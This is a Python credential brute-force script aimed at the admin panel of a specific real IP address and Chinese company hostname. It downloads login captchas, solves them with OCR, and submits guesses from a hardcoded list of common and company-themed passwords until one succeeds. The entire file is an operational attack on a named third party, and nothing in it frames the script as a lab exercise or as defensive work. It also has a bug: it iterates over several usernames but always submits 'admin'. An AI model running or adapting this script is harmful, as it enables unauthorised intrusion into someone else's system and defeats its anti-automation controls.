#!/usr/bin/env python3
"""sunten_bf_local.py - 113.96.190.199 O.Creative爆破(165直连+Host头)
流程: curl下载验证码 -> ddddocr识别 -> curl提交
判定: error:0=成功, 用户名或密码错误=密码错, 验证码不正确=重取
"""
import subprocess, re, sys, time, io, json, os
import ddddocr
from PIL import Image

BASE = 'https://113.96.190.199'
HOST_HDR = 'Host: en.sunten.com.cn'
CK = '/tmp/st_ck.txt'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "sunten", "sunten123", "sunten2024", "ocreative",
             "suntentech", "123456789", "1qaz2wsx", "qwe123", "admin!@#",
             "sunten2023", "suntensz", "st2024", "adminadmin", "en.sunten",
             "suntensc", "sunten.com", "suntencn", "Sunten@123", "sunten1234"]

ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

def get_cap():
    r = subprocess.run(['curl', '-sk', '-c', CK, '-H', HOST_HDR,
                        BASE + '/admin.php/Auth/verify', '-o', '/tmp/st_cap.png'],
                       capture_output=True, timeout=25)
    try:
        img = open('/tmp/st_cap.png', 'rb').read()
    except Exception:
        return None
    if len(img) < 50:
        return None
    try:
        c1 = ocr.classification(img)
        im = Image.open(io.BytesIO(img)).convert('L')
        im = im.resize((im.width * 4, im.height * 4), Image.LANCZOS)
        im = im.point(lambda p: 255 if p > 120 else 0)
        buf = io.BytesIO(); im.save(buf, 'PNG')
        c2 = ocrb.classification(buf.getvalue())
        return c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
    except Exception:
        return c1 if 'c1' in dir() else None

def do_login(pw, code):
    r = subprocess.run(['curl', '-sk', '-b', CK, '-c', CK, '-H', HOST_HDR,
                        '-H', 'X-Requested-With: XMLHttpRequest',
                        '-X', 'POST', BASE + '/admin.php/Auth/login',
                        '-d', 'username=admin&password=%s&secode=%s' % (pw, code)],
                       capture_output=True, timeout=25)
    try:
        d = json.loads(r.stdout.decode('utf-8', 'ignore'))
        return d.get('error'), d.get('msg', '')
    except Exception:
        return 'parse', r.stdout[:100]

def main():
    for user in ['admin', 'root', 'test', 'sunten', 'manager']:
        print('=== user %s ===' % user, flush=True)
        for pw in PASSWORDS:
            for attempt in range(8):
                code = get_cap()
                if not code:
                    print('cap fail %s/%s' % (user, pw), flush=True)
                    time.sleep(2)
                    continue
                err, msg = do_login(pw, code)
                if '验证码' in str(msg):
                    continue
                if err == 0 or err is None:
                    print('!!! HIT: %s/%s code=%s' % (user, pw, code), flush=True)
                    sys.exit(0)
                if '密码' in str(msg) or '用户名' in str(msg) or '错误' in str(msg):
                    print('pw-wrong %s/%s (code=%s)' % (user, pw, code), flush=True)
                    time.sleep(1)
                    break
                print('CHECK %s/%s: err=%s msg=%s' % (user, pw, err, msg[:60]), flush=True)
                time.sleep(1)
                break
        print('user %s done' % user, flush=True)
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
